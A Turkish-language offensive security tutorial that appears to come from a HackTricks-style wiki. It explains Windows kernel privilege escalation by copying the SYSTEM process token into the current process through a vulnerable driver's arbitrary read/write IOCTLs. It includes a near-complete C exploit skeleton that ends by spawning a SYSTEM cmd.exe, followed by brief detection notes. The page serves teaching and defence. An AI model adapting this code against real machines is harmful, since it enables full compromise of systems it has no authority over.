# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Genel bakış

Güvenlik açığı bulunan bir driver, saldırgana arbitrary kernel read ve/veya write primitive'leri sağlayan bir IOCTL sunuyorsa, NT AUTHORITY\SYSTEM yetkisine yükselme çoğu zaman bir SYSTEM access token'ı çalarak gerçekleştirilebilir. Bu technique, Token pointer'ını bir SYSTEM process'inin EPROCESS yapısından mevcut process'in EPROCESS yapısına kopyalar.<sup>[[2]](#references)</sup>

Çalışma nedeni:
- Her process, diğer alanların yanı sıra bir Token içeren bir EPROCESS yapısına sahiptir (aslında bu, bir token object'ine yönelik EX_FAST_REF'dir).
- SYSTEM process'i (PID 4), tüm privilege'lar etkin olan bir token tutar.
- Mevcut process'in EPROCESS.Token alanını SYSTEM token pointer'ı ile değiştirmek, mevcut process'in hemen SYSTEM olarak çalışmasını sağlar.<sup>[[1]](#references)</sup>

> EPROCESS içindeki offset'ler Windows sürümleri arasında değişiklik gösterir. Bunları dinamik olarak (symbols) belirleyin veya sürüme özel sabitler kullanın. Ayrıca EPROCESS.Token'ın bir EX_FAST_REF olduğunu unutmayın (düşük 3 bit reference count flag'leridir).

## Üst düzey adımlar

1) ntoskrnl.exe base adresini bulun ve PsInitialSystemProcess adresini resolve edin.
- User mode'dan, yüklenmiş driver base adreslerini almak için NtQuerySystemInformation(SystemModuleInformation) veya EnumDeviceDrivers kullanın.
- Adresini elde etmek için PsInitialSystemProcess offset'ini (symbols/reversing üzerinden) kernel base adresine ekleyin.
2) PsInitialSystemProcess adresindeki pointer'ı okuyun → bu, SYSTEM'ın EPROCESS yapısına yönelik bir kernel pointer'ıdır.
3) SYSTEM EPROCESS'inden UniqueProcessId ve ActiveProcessLinks offset'lerini okuyarak EPROCESS yapılarının doubly linked list'i (ActiveProcessLinks.Flink/Blink) üzerinde ilerleyin ve UniqueProcessId değeri GetCurrentProcessId() ile eşleşen EPROCESS'i bulana kadar devam edin. Her ikisini de saklayın:
- EPROCESS_SYSTEM (SYSTEM için)
- EPROCESS_SELF (mevcut process için)
4) SYSTEM token değerini okuyun: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Düşük 3 biti mask'leyin: Token_SYS_masked = Token_SYS & ~0xF (build'e bağlı olarak yaygın biçimde ~0xF veya ~0x7 kullanılır; x64 üzerinde düşük 3 bit kullanılır — 0xFFFFFFFFFFFFFFF8 mask'i).
5) Option A (yaygın): Embedded ref count değerini tutarlı bırakmak için düşük 3 biti mevcut token'ınızdan koruyun ve SYSTEM pointer'ına ekleyin.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Kernel write primitive'inizi kullanarak Token_NEW değerini (EPROCESS_SELF + TokenOffset) adresine geri yazın.
7) Mevcut process'iniz artık SYSTEM'dir. İsteğe bağlı olarak doğrulamak için yeni bir cmd.exe veya powershell.exe başlatın.<sup>[[1]](#references)</sup>

## Pseudocode

Aşağıda, vulnerable driver'dan yalnızca iki IOCTL kullanan bir skeleton verilmiştir: biri 8-byte kernel read, diğeri 8-byte kernel write içindir. Kendi driver'ınızın interface'i ile değiştirin.<sup>[[1]](#references)</sup>
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Notlar:
- Offsets: Doğru offset'leri almak için hedefin PDB'leriyle WinDbg’nin `dt nt!_EPROCESS` komutunu veya runtime symbol loader kullanın. Offset'leri düşünmeden hardcode etmeyin.
- Mask: x64 üzerinde token bir EX_FAST_REF'dir; en düşük 3 bit reference count bit'leridir. Token'ınızdaki orijinal düşük bit'leri korumak, anlık refcount tutarsızlıklarını önler.
- Stability: Mevcut process'i elevate etmeyi tercih edin; kısa ömürlü bir helper'ı elevate ederseniz, helper sonlandığında SYSTEM yetkisini kaybedebilirsiniz.<sup>[[1]](#references)</sup>

## Detection & mitigation
- Güçlü IOCTL'ler sunan unsigned veya güvenilmeyen third-party driver'ların yüklenmesi root cause'dur.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard ve Attack Surface Reduction kuralları, vulnerable driver'ların yüklenmesini önleyebilir.
- EDR, arbitrary read/write gerçekleştiren şüpheli IOCTL sequence'lerini ve token swap'lerini izleyebilir.

## References

- [1] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [2] [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
